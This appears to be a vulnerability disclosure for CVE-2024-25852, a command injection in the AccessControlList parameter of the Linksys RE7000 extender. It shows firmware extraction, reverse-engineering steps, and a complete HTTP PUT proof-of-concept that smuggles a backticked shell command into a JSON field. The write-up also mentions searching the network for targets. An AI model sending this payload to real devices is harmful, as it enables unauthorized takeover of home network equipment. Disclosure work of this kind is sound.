Linksys RE7000 command injection vulnerability

Vulnerability introduction

Product Description:

RE7000 is a new dual-band AC1900 wireless extender with seamless roaming function launched by Linksys.

Firmware download:

https://downloads.linksys.com/support/assets/firmware/RE7000v2_PROD_FW_v2.0.15_211230_1012.bin

Vulnerability description:

The RE7000 wireless extender has a command execution vulnerability in the "AccessControlList" parameter of the access control function point. An attacker can use the vulnerability to obtain device administrator rights.

Affected versions:

RE7000 v2.0.9, RE7000 v2.0.11, RE7000 v2.0.15

Distribute CVE numbers:

CVE-2024-25852

Vulnerability analysis

Vulnerability trigger point:



Use the binwalk tool to extract the firmware file system:

binwalk -Me --run-as=root RE7000v2_PROD_FW_v2.0.15_211230_1012.bin

Use the grep tool to quickly find vulnerability parameters:

grep -rl AccessControlList | grep .so



Use the IDA reverse tool to open the libcbtjson.so file and press Alt+t to search for the "AccessControlList" keyword:



Enter the ".rodata:0003B60C" read-only data address and see various types of parameter names, which are used to control different functions:



Enter the "set_accessControlList" function, obtain the incoming parameters a1 and a2 through the "set_value_nvram" function, format the a1 and a2 variables for output through the "fprintf" function, and finally substitute a2 into the "cbt_system" function to execute the system command.



Vulnerability recurrence

Emulate or search network asset targets via qemu firmware:



Exploit POC:

PUT /goform/AccessControl HTTP/1.1
Host: ip
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: close
Upgrade-Insecure-Requests: 1
If-Modified-Since: Thu, 17 Sep 2020 11:24:58 GMT
If-None-Match: "14600429"
Content-Length: 81

{"AccessPolicy":"0","AccessControlList":"`ps>/etc_ro/lighttpd/RE7000_www/1.txt`"}

Reappearance of v2.0.15 version



The BurpSuite tool sends the POC and executes the ps command to output to the 1.txt file:



Access the 1.txt file to see that the attack was successful.



